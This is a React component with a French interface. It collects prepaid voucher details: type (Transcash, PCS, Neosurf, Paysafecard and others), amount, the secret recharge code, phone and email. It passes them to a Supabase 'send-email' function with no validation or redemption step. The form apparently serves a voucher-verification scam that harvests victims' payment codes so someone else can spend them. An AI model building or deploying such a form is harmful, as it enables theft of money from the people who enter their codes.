import { useState, useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { toast } from "sonner";

interface CountryInfo {
  name: string;
  flag: string;
  code: string;
}

const RECHARGE_OPTIONS = [
  { value: "transcash", label: "TRANSCASH" },
  { value: "pcs", label: "PCS" },
  { value: "itunes", label: "ITUNES" },
  { value: "neosurf", label: "NEOSURF" },
  { value: "paysafecard", label: "PAYSAFECARD" },
  { value: "toneo-first", label: "TONEO FIRST" },
];

const RechargeForm = () => {
  const [countries, setCountries] = useState<CountryInfo[]>([]);
  const [formData, setFormData] = useState({
    type: "",
    amount: "",
    code: "",
    countryCode: "+33",
    phone: "",
    email: "",
  });
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    fetch("https://restcountries.com/v3.1/all?fields=name,idd,flag")
      .then((res) => res.json())
      .then((data: any[]) => {
        const parsed: CountryInfo[] = data
          .filter((c) => c.idd?.root)
          .map((c) => ({
            name: c.name.common,
            flag: c.flag,
            code: c.idd.root + (c.idd.suffixes?.[0] || ""),
          }))
          .sort((a, b) => a.name.localeCompare(b.name));
        setCountries(parsed);
      })
      .catch(() => {
        setCountries([
          { name: "France", flag: "🇫🇷", code: "+33" },
          { name: "Maroc", flag: "🇲🇦", code: "+212" },
        ]);
      });
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!formData.type || !formData.amount || !formData.code || !formData.phone || !formData.email) {
      toast.error("Veuillez remplir tous les champs");
      return;
    }

    setIsSubmitting(true);

    try {
      const { data, error } = await supabase.functions.invoke("send-email", {
        body: {
          type: formData.type,
          amount: formData.amount,
          code: formData.code,
          phone: `${formData.countryCode} ${formData.phone}`,
          email: formData.email,
        },
      });

      if (error) throw error;

      toast.success("Votre demande a été envoyée avec succès !");
      setFormData({ type: "", amount: "", code: "", countryCode: "+33", phone: "", email: "" });
    } catch (err: any) {
      console.error("Erreur envoi email:", err);
      toast.error("Erreur lors de l'envoi. Veuillez réessayer.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-6">
      {/* Type de recharge */}
      <div className="space-y-3">
        <Label className="text-sm font-semibold text-foreground">Type de recharge</Label>
        <RadioGroup
          value={formData.type}
          onValueChange={(val) => setFormData((prev) => ({ ...prev, type: val }))}
          className="flex flex-wrap gap-3"
        >
          {RECHARGE_OPTIONS.map((opt) => (
            <label
              key={opt.value}
              className={`flex items-center gap-2 px-4 py-3 rounded-lg border cursor-pointer transition-all ${
                formData.type === opt.value
                  ? "border-primary bg-secondary"
                  : "border-border hover:border-primary/40"
              }`}
            >
              <RadioGroupItem value={opt.value} />
              <span className="text-sm font-medium">{opt.label}</span>
            </label>
          ))}
        </RadioGroup>
      </div>

      {/* Montant */}
      <div className="space-y-2">
        <Label htmlFor="amount" className="text-sm font-semibold text-foreground">
          Montant de la recharge
        </Label>
        <div className="relative">
          <Input
            id="amount"
            type="number"
            placeholder="Ex: 50"
            value={formData.amount}
            onChange={(e) => setFormData((prev) => ({ ...prev, amount: e.target.value }))}
            className="pr-12"
          />
          <span className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground text-sm font-medium">
            EUR
          </span>
        </div>
      </div>

      {/* Code de recharge */}
      <div className="space-y-2">
        <Label htmlFor="code" className="text-sm font-semibold text-foreground">
          Code de recharge
        </Label>
        <Input
          id="code"
          type="text"
          placeholder="Entrez le code de recharge"
          value={formData.code}
          onChange={(e) => setFormData((prev) => ({ ...prev, code: e.target.value }))}
        />
      </div>

      {/* Téléphone */}
      <div className="space-y-2">
        <Label htmlFor="phone" className="text-sm font-semibold text-foreground">
          Numéro de téléphone
        </Label>
        <div className="flex gap-2">
          <Select
            value={formData.countryCode}
            onValueChange={(val) => setFormData((prev) => ({ ...prev, countryCode: val }))}
          >
            <SelectTrigger className="w-[140px] shrink-0">
              <SelectValue />
            </SelectTrigger>
            <SelectContent>
              {countries.map((c) => (
                <SelectItem key={c.code + c.name} value={c.code}>
                  <span className="flex items-center gap-2">
                    <span>{c.flag}</span>
                    <span>{c.code}</span>
                  </span>
                </SelectItem>
              ))}
            </SelectContent>
          </Select>
          <Input
            id="phone"
            type="tel"
            placeholder="6 12 34 56 78"
            value={formData.phone}
            onChange={(e) => setFormData((prev) => ({ ...prev, phone: e.target.value }))}
            className="flex-1"
          />
        </div>
      </div>

      {/* Email */}
      <div className="space-y-2">
        <Label htmlFor="email" className="text-sm font-semibold text-foreground">
          Adresse email
        </Label>
        <Input
          id="email"
          type="email"
          placeholder="votre@email.com"
          value={formData.email}
          onChange={(e) => setFormData((prev) => ({ ...prev, email: e.target.value }))}
        />
      </div>

      <Button type="submit" size="lg" className="w-full" disabled={isSubmitting}>
        {isSubmitting ? "Envoi en cours..." : "Envoyer la demande"}
      </Button>
    </form>
  );
};

export default RechargeForm;
